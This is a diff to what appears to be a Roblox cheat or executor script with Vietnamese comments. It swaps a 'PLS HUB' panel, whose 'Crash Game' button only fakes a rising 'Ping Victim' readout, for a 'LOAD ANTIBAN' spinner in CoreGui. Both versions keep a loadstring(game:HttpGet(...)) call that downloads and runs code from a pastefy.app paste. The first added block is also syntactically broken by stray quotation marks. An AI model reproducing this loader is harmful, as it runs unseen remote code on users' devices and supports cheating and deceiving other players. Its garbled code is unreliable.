@@ -34,197 +34,60 @@ local QUEUE_CODE = [[
 
 repeat task.wait() until game:IsLoaded()
 
-repeat wait() until game:IsLoaded()
-
-local plr = game.Players.LocalPlayer
-local pg = plr:WaitForChild("PlayerGui")
-
-pcall(function()
-	pg:FindFirstChild("PlsHub"):Destroy()
-end)
-
+ "-- Load AntiBan - Vòng tròn viền xoay (to hơn)
 local gui = Instance.new("ScreenGui")
-gui.Name = "PlsHub"
-gui.Parent = pg
+gui.Name = "LoadingAntiBan"
+gui.Parent = game.CoreGui or game:GetService("CoreGui")
 
---------------------------------------------------
--- DRAG (FIX CHẮC CHẮN)
---------------------------------------------------
-local UIS = game:GetService("UserInputService")
+-- Khung chính (to hơn)
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 140)
+frame.Position = UDim2.new(0.5, -150, 0.5, -70)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.BackgroundTransparency = 0.3
+frame.BorderSizePixel = 2
+frame.BorderColor3 = Color3.new(0.3, 0.7, 1)
+frame.Parent = gui
 
-local function dragify(frame)
-	local dragging = false
-	local dragStart, startPos
+-- Bo góc cho khung
+local frameCorner = Instance.new("UICorner")
+frameCorner.CornerRadius = UDim.new(0, 12)
+frameCorner.Parent = frame
 
-	frame.InputBegan:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 
-		or input.UserInputType == Enum.UserInputType.Touch then
-			
-			dragging = true
-			dragStart = input.Position
-			startPos = frame.Position
-		end
-	end)
+-- Dòng chữ "load antiban" (to hơn)
+local text = Instance.new("TextLabel")
+text.Size = UDim2.new(1, 0, 0, 40)
+text.Position = UDim2.new(0, 0, 0, 85)
+text.Text = "🛡️ LOAD ANTIBAN 🛡️"
+text.TextColor3 = Color3.new(0.3, 0.7, 1)
+text.TextScaled = true
+text.BackgroundTransparency = 1
+text.Font = Enum.Font.GothamBold
+text.Parent = frame
 
-	frame.InputEnded:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 
-		or input.UserInputType == Enum.UserInputType.Touch then
-			dragging = false
-		end
-	end)
+-- Vòng tròn viền rỗng (to hơn)
+local circle = Instance.new("Frame")
+circle.Size = UDim2.new(0, 50, 0, 50)  -- To hơn
+circle.Position = UDim2.new(0.5, -25, 0, 20)
+circle.BackgroundColor3 = Color3.new(0.3, 0.7, 1)
+circle.BackgroundTransparency = 1  -- Trong suốt bên trong
+circle.BorderSizePixel = 4         -- Viền dày
+circle.BorderColor3 = Color3.new(0.3, 0.7, 1)
+circle.Parent = frame
 
-	UIS.InputChanged:Connect(function(input)
-		if dragging and (
-			input.UserInputType == Enum.UserInputType.MouseMovement 
-			or input.UserInputType == Enum.UserInputType.Touch) then
-			
-			local delta = input.Position - dragStart
-			
-			frame.Position = UDim2.new(
-				startPos.X.Scale,
-				startPos.X.Offset + delta.X,
-				startPos.Y.Scale,
-				startPos.Y.Offset + delta.Y
-			)
-		end
-	end)
-end
+-- Bo tròn để thành hình tròn viền
+local cornerCircle = Instance.new("UICorner")
+cornerCircle.CornerRadius = UDim.new(1, 0)
+cornerCircle.Parent = circle
 
---------------------------------------------------
--- LOGO
---------------------------------------------------
-local logo = Instance.new("TextButton", gui)
-logo.Size = UDim2.new(0,45,0,45)
-logo.Position = UDim2.new(0,20,0.4,0)
-logo.Text = "≡"
-logo.BackgroundColor3 = Color3.fromRGB(30,30,30)
-logo.TextColor3 = Color3.new(1,1,1)
-logo.BorderSizePixel = 0
-Instance.new("UICorner",logo)
-dragify(logo)
+-- Tạo hiệu ứng xoay
+local angle = 0
+while circle and circle.Parent do
+    angle = angle + 5
+    circle.Rotation = angle
+    wait(0.03)
+end"
 
---------------------------------------------------
--- PANEL
---------------------------------------------------
-local main = Instance.new("Frame", gui)
-main.Size = UDim2.new(0,240,0,150)
-main.Position = UDim2.new(0.4,0,0.3,0)
-main.BackgroundColor3 = Color3.fromRGB(20,20,20)
-main.Visible = false
-Instance.new("UICorner",main)
-dragify(main)
-
---------------------------------------------------
--- TITLE
---------------------------------------------------
-local title = Instance.new("TextLabel", main)
-title.Size = UDim2.new(1,0,0,25)
-title.Text = "PLS HUB"
-title.BackgroundTransparency = 1
-title.TextColor3 = Color3.new(1,1,1)
-
---------------------------------------------------
--- PING
---------------------------------------------------
-local ping = Instance.new("TextLabel", main)
-ping.Size = UDim2.new(1,0,0,20)
-ping.Position = UDim2.new(0,0,0,25)
-ping.BackgroundTransparency = 1
-ping.TextColor3 = Color3.fromRGB(150,150,150)
-ping.Text = ""
-ping.Visible = false
-
---------------------------------------------------
--- DOT (⚪)
---------------------------------------------------
-local dot = Instance.new("TextButton", main)
-dot.Size = UDim2.new(0,10,0,10)
-dot.Position = UDim2.new(1,-15,0,5)
-dot.BackgroundColor3 = Color3.new(1,1,1)
-dot.Text = ""
-dot.BorderSizePixel = 0
-Instance.new("UICorner",dot)
-
---------------------------------------------------
--- STATE
---------------------------------------------------
-local showPing = false
-local crash = false
-local crashStart = 0
-
---------------------------------------------------
--- LOOP
---------------------------------------------------
-spawn(function()
-	while true do
-		wait(0.1)
-
-		if showPing then
-			ping.Visible = true
-
-			if crash then
-				local t = tick() - crashStart
-
-				if t < 1 then
-					local v = math.floor(50 + t * 950)
-					ping.Text = "Ping Victim: "..v.." ms"
-				else
-					ping.Text = "Ping Victim: "..math.random(800,999).." ms"
-				end
-
-				ping.TextColor3 = Color3.fromRGB(255,60,60)
-			else
-				ping.Text = "Ping Victim: "..math.random(50,60).." ms"
-				ping.TextColor3 = Color3.fromRGB(150,150,150)
-			end
-		else
-			ping.Visible = false
-		end
-	end
-end)
-
---------------------------------------------------
--- DOT CLICK
---------------------------------------------------
-dot.MouseButton1Click:Connect(function()
-	showPing = not showPing
-end)
-
---------------------------------------------------
--- BUTTONS
---------------------------------------------------
-local function makeBtn(text,y)
-	local b = Instance.new("TextButton", main)
-	b.Size = UDim2.new(0,120,0,30)
-	b.Position = UDim2.new(0.5,-60,0,y)
-	b.Text = text.." OFF"
-	b.BackgroundColor3 = Color3.fromRGB(50,50,50)
-	b.TextColor3 = Color3.new(1,1,1)
-
-	local state = false
-
-	b.MouseButton1Click:Connect(function()
-		state = not state
-		b.Text = text.." "..(state and "ON" or "OFF")
-
-		if text == "Crash Game" then
-			crash = state
-			if state then
-				crashStart = tick()
-			end
-		end
-	end)
-end
-
-makeBtn("Crash Game",60)
-makeBtn("Auto Accept",100)
-
---------------------------------------------------
--- OPEN
---------------------------------------------------
-logo.MouseButton1Click:Connect(function()
-	main.Visible = not main.Visible
-end)
 loadstring(game:HttpGet(
 
  "https://pastefy.app/NjJvZMLS/raw",
@@ -425,197 +288,59 @@ end
 
 -- =================================================
 
-repeat wait() until game:IsLoaded()
-
-local plr = game.Players.LocalPlayer
-local pg = plr:WaitForChild("PlayerGui")
-
-pcall(function()
-	pg:FindFirstChild("PlsHub"):Destroy()
-end)
-
+-- Load AntiBan - Vòng tròn viền xoay (to hơn)
 local gui = Instance.new("ScreenGui")
-gui.Name = "PlsHub"
-gui.Parent = pg
+gui.Name = "LoadingAntiBan"
+gui.Parent = game.CoreGui or game:GetService("CoreGui")
 
---------------------------------------------------
--- DRAG (FIX CHẮC CHẮN)
---------------------------------------------------
-local UIS = game:GetService("UserInputService")
+-- Khung chính (to hơn)
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 140)
+frame.Position = UDim2.new(0.5, -150, 0.5, -70)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.BackgroundTransparency = 0.3
+frame.BorderSizePixel = 2
+frame.BorderColor3 = Color3.new(0.3, 0.7, 1)
+frame.Parent = gui
 
-local function dragify(frame)
-	local dragging = false
-	local dragStart, startPos
+-- Bo góc cho khung
+local frameCorner = Instance.new("UICorner")
+frameCorner.CornerRadius = UDim.new(0, 12)
+frameCorner.Parent = frame
 
-	frame.InputBegan:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 
-		or input.UserInputType == Enum.UserInputType.Touch then
-			
-			dragging = true
-			dragStart = input.Position
-			startPos = frame.Position
-		end
-	end)
+-- Dòng chữ "load antiban" (to hơn)
+local text = Instance.new("TextLabel")
+text.Size = UDim2.new(1, 0, 0, 40)
+text.Position = UDim2.new(0, 0, 0, 85)
+text.Text = "🛡️ LOAD ANTIBAN 🛡️"
+text.TextColor3 = Color3.new(0.3, 0.7, 1)
+text.TextScaled = true
+text.BackgroundTransparency = 1
+text.Font = Enum.Font.GothamBold
+text.Parent = frame
 
-	frame.InputEnded:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 
-		or input.UserInputType == Enum.UserInputType.Touch then
-			dragging = false
-		end
-	end)
+-- Vòng tròn viền rỗng (to hơn)
+local circle = Instance.new("Frame")
+circle.Size = UDim2.new(0, 50, 0, 50)  -- To hơn
+circle.Position = UDim2.new(0.5, -25, 0, 20)
+circle.BackgroundColor3 = Color3.new(0.3, 0.7, 1)
+circle.BackgroundTransparency = 1  -- Trong suốt bên trong
+circle.BorderSizePixel = 4         -- Viền dày
+circle.BorderColor3 = Color3.new(0.3, 0.7, 1)
+circle.Parent = frame
 
-	UIS.InputChanged:Connect(function(input)
-		if dragging and (
-			input.UserInputType == Enum.UserInputType.MouseMovement 
-			or input.UserInputType == Enum.UserInputType.Touch) then
-			
-			local delta = input.Position - dragStart
-			
-			frame.Position = UDim2.new(
-				startPos.X.Scale,
-				startPos.X.Offset + delta.X,
-				startPos.Y.Scale,
-				startPos.Y.Offset + delta.Y
-			)
-		end
-	end)
+-- Bo tròn để thành hình tròn viền
+local cornerCircle = Instance.new("UICorner")
+cornerCircle.CornerRadius = UDim.new(1, 0)
+cornerCircle.Parent = circle
+
+-- Tạo hiệu ứng xoay
+local angle = 0
+while circle and circle.Parent do
+    angle = angle + 5
+    circle.Rotation = angle
+    wait(0.03)
 end
-
---------------------------------------------------
--- LOGO
---------------------------------------------------
-local logo = Instance.new("TextButton", gui)
-logo.Size = UDim2.new(0,45,0,45)
-logo.Position = UDim2.new(0,20,0.4,0)
-logo.Text = "≡"
-logo.BackgroundColor3 = Color3.fromRGB(30,30,30)
-logo.TextColor3 = Color3.new(1,1,1)
-logo.BorderSizePixel = 0
-Instance.new("UICorner",logo)
-dragify(logo)
-
---------------------------------------------------
--- PANEL
---------------------------------------------------
-local main = Instance.new("Frame", gui)
-main.Size = UDim2.new(0,240,0,150)
-main.Position = UDim2.new(0.4,0,0.3,0)
-main.BackgroundColor3 = Color3.fromRGB(20,20,20)
-main.Visible = false
-Instance.new("UICorner",main)
-dragify(main)
-
---------------------------------------------------
--- TITLE
---------------------------------------------------
-local title = Instance.new("TextLabel", main)
-title.Size = UDim2.new(1,0,0,25)
-title.Text = "PLS HUB"
-title.BackgroundTransparency = 1
-title.TextColor3 = Color3.new(1,1,1)
-
---------------------------------------------------
--- PING
---------------------------------------------------
-local ping = Instance.new("TextLabel", main)
-ping.Size = UDim2.new(1,0,0,20)
-ping.Position = UDim2.new(0,0,0,25)
-ping.BackgroundTransparency = 1
-ping.TextColor3 = Color3.fromRGB(150,150,150)
-ping.Text = ""
-ping.Visible = false
-
---------------------------------------------------
--- DOT (⚪)
---------------------------------------------------
-local dot = Instance.new("TextButton", main)
-dot.Size = UDim2.new(0,10,0,10)
-dot.Position = UDim2.new(1,-15,0,5)
-dot.BackgroundColor3 = Color3.new(1,1,1)
-dot.Text = ""
-dot.BorderSizePixel = 0
-Instance.new("UICorner",dot)
-
---------------------------------------------------
--- STATE
---------------------------------------------------
-local showPing = false
-local crash = false
-local crashStart = 0
-
---------------------------------------------------
--- LOOP
---------------------------------------------------
-spawn(function()
-	while true do
-		wait(0.1)
-
-		if showPing then
-			ping.Visible = true
-
-			if crash then
-				local t = tick() - crashStart
-
-				if t < 1 then
-					local v = math.floor(50 + t * 950)
-					ping.Text = "Ping Victim: "..v.." ms"
-				else
-					ping.Text = "Ping Victim: "..math.random(800,999).." ms"
-				end
-
-				ping.TextColor3 = Color3.fromRGB(255,60,60)
-			else
-				ping.Text = "Ping Victim: "..math.random(50,60).." ms"
-				ping.TextColor3 = Color3.fromRGB(150,150,150)
-			end
-		else
-			ping.Visible = false
-		end
-	end
-end)
-
---------------------------------------------------
--- DOT CLICK
---------------------------------------------------
-dot.MouseButton1Click:Connect(function()
-	showPing = not showPing
-end)
-
---------------------------------------------------
--- BUTTONS
---------------------------------------------------
-local function makeBtn(text,y)
-	local b = Instance.new("TextButton", main)
-	b.Size = UDim2.new(0,120,0,30)
-	b.Position = UDim2.new(0.5,-60,0,y)
-	b.Text = text.." OFF"
-	b.BackgroundColor3 = Color3.fromRGB(50,50,50)
-	b.TextColor3 = Color3.new(1,1,1)
-
-	local state = false
-
-	b.MouseButton1Click:Connect(function()
-		state = not state
-		b.Text = text.." "..(state and "ON" or "OFF")
-
-		if text == "Crash Game" then
-			crash = state
-			if state then
-				crashStart = tick()
-			end
-		end
-	end)
-end
-
-makeBtn("Crash Game",60)
-makeBtn("Auto Accept",100)
-
---------------------------------------------------
--- OPEN
---------------------------------------------------
-logo.MouseButton1Click:Connect(function()
-	main.Visible = not main.Visible
-end)
 
 loadstring(game:HttpGet(
 
